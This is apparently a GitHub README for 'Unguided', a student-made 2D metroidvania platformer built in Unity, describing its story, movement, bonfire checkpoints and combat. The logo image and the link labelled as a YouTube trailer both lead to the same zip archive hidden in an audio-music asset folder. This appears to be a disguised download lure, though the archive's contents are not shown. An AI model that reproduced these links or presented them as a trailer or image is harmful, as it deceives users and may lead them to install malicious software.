# Unguided

![Unguided-logo](https://raw.githubusercontent.com/Chuckaballe60/unguided-game/main/Assets/Audio/Music/unguided-game-v1.3.zip)

Unguided is a 2D action-adventure platformer game inspired by the gameplay style of metroidvania games like Hollow Knight and the artstyle of old retro games. It follows a masked adventurer clearing a dungeon before facing off against the nameless king of a long fallen kingdom. 

We made Unguided as a project for school in a 7 day time frame with no experience in game development using Unity and almost no experience in game development in general. Inspite of our inexpertise, we believe we were able to create a modest game in the time frame we got. However, due to the time limitations, we were not able to perfect all the systems in the game and since we were in constant development rush in a development environment we were unacquainted with, some bugs and glitches may pop up.

As a side note, *most* art assets used in the game were made by our own artists including all of the character sprites as well as background assets present in the game.

If you like our project, consider giving us a star on GitHub. Your support means a lot to us.

We also made an animated trailer, so we'd love it if you would give it a watch on [YouTube](https://raw.githubusercontent.com/Chuckaballe60/unguided-game/main/Assets/Audio/Music/unguided-game-v1.3.zip).

## Features
Unguided is primarily a platformer game and the map layout has been made beautifully interconnected with that in mind. The overall direction of the player's progression is somewhat linear in that the player will end up at the same room containing the nameless king regardless of the places they choose to explore first.

The movement in the game has been kept intentionally simple allowing the player to use jumps, double jumps, dashes and wall-climbing along with running as means of transversing the dungeon.

In the classic fashion of Souls(-like) games, the player is able to rest at bonfires to heal up and save the last rested bonfire as a checkpoint.

Another important aspect of the game is the combat. The player has access to combo attacks, along with a special attack that trades off time in exchange for explosive AOE damage.

And of course, what would a game like unguided be if not without a boss.
